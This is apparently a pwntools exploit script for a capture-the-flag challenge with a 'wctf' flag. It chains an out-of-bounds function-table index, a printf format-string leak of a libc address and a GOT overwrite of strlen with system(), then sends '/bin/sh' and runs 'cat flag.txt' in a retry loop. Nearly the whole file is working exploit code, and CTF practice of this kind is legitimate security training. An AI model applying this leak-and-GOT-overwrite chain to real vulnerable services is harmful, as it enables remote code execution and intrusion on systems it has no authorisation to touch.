#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template chal_patched
from pwn import *
from time import sleep
# Set up pwntools for the correct architecture
CHAL = '/challenge/chal'
LIBC = '/challenge/libc.so.6'
exe = context.binary = ELF(args.EXE or CHAL)
libc = ELF(LIBC)
#ld = ELF("./ld-linux-x86-64.so.2")

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        r = remote("addr", 1337)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak *0x{exe.entry:x}
continue
br *fn_call+158
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    No RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x3fe000)
# RUNPATH:  b'.'

'''
Idea:
    1. Use OOB array access to call the reflect func and use printf to leak stack value
    2. Use OOB array again to call reflect and use printf to write exe.got['printf'] with libc.sym.system 
    3. provide /bin/sh as input

Alternatively:
    1. same
    2. Use OOB array again to use printf to write exe.got['exit'] with system and global with ptr to /bin/sh
    3. give invalid index to call exit
'''
def gen_exploit(payload):
    return payload + (240-len(payload))*b'A' + p64(exe.sym['reflect'])

ref = p64(exe.sym['reflect'])
for i in range(5):
    #io = start()
    io = remote('127.0.0.1', 1337)

    # read from .data section of hexdump also use pwntools if not stripped (dummy)
    # possibly unnecessary for exploit
    glob_addr = 0x403930
    log.info(hex(exe.sym['EXIT_CODE']))

    # STAGE 1: leak memory
    #--------------------------------
    log.info("Stage 1")

    #determined through gdb 
    index = b'-8'
    io.recvuntil(b'Choose a function:')
    io.sendline(index)

    #payload = gen_exploit(b"AAAAAAAA %14$p ")
    # determined start of write is 14
    payload = gen_exploit(b'%79$p')
    io.recvuntil(b'Provide your almighty STRING:')
    io.recvline()

    io.sendline(payload)
    leak = io.recvuntil(b'A',drop=True)
    log.info(leak)

    libc_start_main = int(leak,16) -133
    log.success("libc_start_main "+hex(libc_start_main))

    libc.address = libc_start_main - 0x027280
    log.success("Found system: "+hex(libc.sym.system))

    binsh = libc.address + 0x196031
    log.success("Found binsh: "+hex(binsh))

    # STAGE 2: overwrite got
    #------------------------------
    log.info("Stage2:")
    io.sendline(index)

    writes = {exe.got['strlen']:libc.sym.system}
    fmt = fmtstr_payload(14, writes, 0)

    payload = gen_exploit(fmt)
    io.sendline(payload)


    # # STAGE 3: call system
    log.info("Stage3:")

    io.sendline(b'0')

    payload = b"/bin/sh"
    io.sendline(payload)

    io.recvuntil(b'STRING:')
    io.recvuntil(b'STRING:')


    io.sendline(b"cat flag.txt")
    io.recv()

    result = str(io.recv().decode('ascii'))

    if 'wctf' in result:
        print(result)
        exit(0)
    else:
        log.info(f'failed {i} times')
        sleep(0.5)
        continue
exit(1)





